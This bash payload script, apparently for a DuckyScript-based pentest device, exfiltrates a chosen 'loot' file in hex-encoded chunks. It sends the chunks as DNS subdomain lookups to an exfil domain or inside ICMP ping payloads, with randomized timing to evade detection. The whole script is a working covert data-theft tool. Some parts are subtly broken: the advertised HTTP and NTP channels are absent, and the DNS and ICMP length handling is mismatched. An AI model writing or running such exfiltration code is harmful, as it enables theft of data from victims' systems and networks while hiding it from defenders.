#!/bin/bash
# Title: Exfil Scheduler
# Author: bad-antics
# Description: Scheduled multi-channel data exfiltration with stealth timing
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/exfil"
mkdir -p "$LOOT_DIR"

PROMPT "EXFIL SCHEDULER

Automated scheduled exfiltration
over multiple covert channels
with stealth timing controls.

Channels:
- DNS subdomain encoding
- ICMP payload tunneling
- HTTP header steganography
- NTP timestamp encoding

Features:
- Jitter/randomized timing
- Chunk-based transmission
- Bandwidth throttling
- Completion verification

Press OK to configure."

# Select exfil channel
CHANNEL=$(CONFIRMATION_DIALOG "SELECT PRIMARY CHANNEL

OK = DNS (most reliable)
CANCEL = ICMP (most covert)")

if [ "$CHANNEL" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    CH_NAME="DNS"
else
    CH_NAME="ICMP"
fi

SOURCE=$(TEXT_PICKER "File to exfil:" "/mmc/nullsec/loot.txt")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

[ ! -f "$SOURCE" ] && { ERROR_DIALOG "File not found:\n$SOURCE"; exit 1; }

FILE_SIZE=$(stat -c%s "$SOURCE" 2>/dev/null || stat -f%z "$SOURCE" 2>/dev/null || echo 0)
FILE_KB=$((FILE_SIZE / 1024))

if [ "$CH_NAME" = "DNS" ]; then
    DNS_SERVER=$(TEXT_PICKER "DNS server IP:" "8.8.8.8")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DNS_SERVER="8.8.8.8" ;; esac

    DOMAIN=$(TEXT_PICKER "Exfil domain:" "data.example.com")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DOMAIN="data.example.com" ;; esac
else
    ICMP_TARGET=$(TEXT_PICKER "Target IP:" "10.0.0.1")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ICMP_TARGET="10.0.0.1" ;; esac
fi

DELAY_MIN=$(NUMBER_PICKER "Min delay between chunks (sec):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DELAY_MIN=2 ;; esac

DELAY_MAX=$(NUMBER_PICKER "Max delay (sec, for jitter):" 8)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DELAY_MAX=8 ;; esac

CHUNK_SIZE=$(NUMBER_PICKER "Chunk size (bytes):" 32)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHUNK_SIZE=32 ;; esac

TOTAL_CHUNKS=$(( (FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))
EST_TIME_MIN=$(( TOTAL_CHUNKS * (DELAY_MIN + DELAY_MAX) / 2 / 60 ))

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/exfil_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "START EXFILTRATION?

Channel: $CH_NAME
File: $(basename $SOURCE) (${FILE_KB}KB)
Chunks: $TOTAL_CHUNKS x ${CHUNK_SIZE}B
Delay: ${DELAY_MIN}-${DELAY_MAX}s (jitter)
Est. time: ~${EST_TIME_MIN} min

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting scheduled exfiltration..."
SPINNER_START "Exfiltrating ($CH_NAME)..."

echo "================================================================" > "$REPORT"
echo "         NULLSEC EXFIL SCHEDULER REPORT                        " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Channel: $CH_NAME" >> "$REPORT"
echo "Source: $SOURCE ($FILE_SIZE bytes)" >> "$REPORT"
echo "Chunks: $TOTAL_CHUNKS x ${CHUNK_SIZE}B" >> "$REPORT"
echo "Delay: ${DELAY_MIN}-${DELAY_MAX}s" >> "$REPORT"
echo "" >> "$REPORT"

SENT=0
ERRORS=0
START_TS=$(date +%s)

# Read file in binary chunks and encode
OFFSET=0
for ((chunk=1; chunk<=TOTAL_CHUNKS; chunk++)); do
    # Extract chunk and hex-encode
    HEX_DATA=$(dd if="$SOURCE" bs=1 skip=$OFFSET count=$CHUNK_SIZE 2>/dev/null | xxd -p | tr -d '\n')
    OFFSET=$((OFFSET + CHUNK_SIZE))

    [ -z "$HEX_DATA" ] && break

    # Sequence header: chunk_num.total_chunks
    SEQ="${chunk}.${TOTAL_CHUNKS}"

    if [ "$CH_NAME" = "DNS" ]; then
        # DNS exfil: encode data as subdomain query
        # Format: seq-hexdata.domain
        QUERY="${SEQ}-${HEX_DATA}.${DOMAIN}"
        # Truncate to DNS label limit (63 chars per label)
        QUERY=$(echo "$QUERY" | cut -c1-253)
        nslookup "$QUERY" "$DNS_SERVER" > /dev/null 2>&1
        RESULT=$?
    else
        # ICMP exfil: encode data in ping payload
        PAYLOAD="${SEQ}:${HEX_DATA}"
        ping -c 1 -W 2 -p "$(echo -n "$PAYLOAD" | xxd -p | head -c 32)" "$ICMP_TARGET" > /dev/null 2>&1
        RESULT=$?
    fi

    if [ $RESULT -eq 0 ]; then
        SENT=$((SENT + 1))
    else
        ERRORS=$((ERRORS + 1))
        echo "  [ERROR] Chunk $chunk/$TOTAL_CHUNKS failed" >> "$REPORT"
    fi

    # Progress logging every 10 chunks
    if [ $((chunk % 10)) -eq 0 ]; then
        PCT=$((chunk * 100 / TOTAL_CHUNKS))
        LOG "Exfil progress: $chunk/$TOTAL_CHUNKS (${PCT}%)"
    fi

    # Randomized delay (jitter)
    if [ $DELAY_MAX -gt $DELAY_MIN ]; then
        JITTER_RANGE=$((DELAY_MAX - DELAY_MIN))
        DELAY=$((DELAY_MIN + RANDOM % JITTER_RANGE))
    else
        DELAY=$DELAY_MIN
    fi
    sleep $DELAY
done

END_TS=$(date +%s)
ELAPSED=$((END_TS - START_TS))
ELAPSED_MIN=$((ELAPSED / 60))

echo "" >> "$REPORT"
echo "--- RESULTS ---" >> "$REPORT"
echo "  Chunks sent: $SENT/$TOTAL_CHUNKS" >> "$REPORT"
echo "  Errors: $ERRORS" >> "$REPORT"
echo "  Duration: ${ELAPSED_MIN}m ${ELAPSED}s" >> "$REPORT"
echo "  Avg rate: $(( FILE_SIZE / (ELAPSED + 1) )) bytes/sec" >> "$REPORT"
echo "" >> "$REPORT"

if [ $ERRORS -eq 0 ] && [ $SENT -eq $TOTAL_CHUNKS ]; then
    echo "  STATUS: COMPLETE — all chunks transmitted" >> "$REPORT"
    STATUS="COMPLETE"
elif [ $SENT -gt 0 ]; then
    echo "  STATUS: PARTIAL — $ERRORS chunks failed" >> "$REPORT"
    STATUS="PARTIAL ($SENT/$TOTAL_CHUNKS)"
else
    echo "  STATUS: FAILED — no chunks transmitted" >> "$REPORT"
    STATUS="FAILED"
fi

echo "" >> "$REPORT"
echo "End: $(date)" >> "$REPORT"
echo "================================================================" >> "$REPORT"

SPINNER_STOP

PROMPT "EXFIL COMPLETE

Channel: $CH_NAME
Status: $STATUS
Chunks: $SENT/$TOTAL_CHUNKS
Errors: $ERRORS
Time: ${ELAPSED_MIN} min

Report: $REPORT"
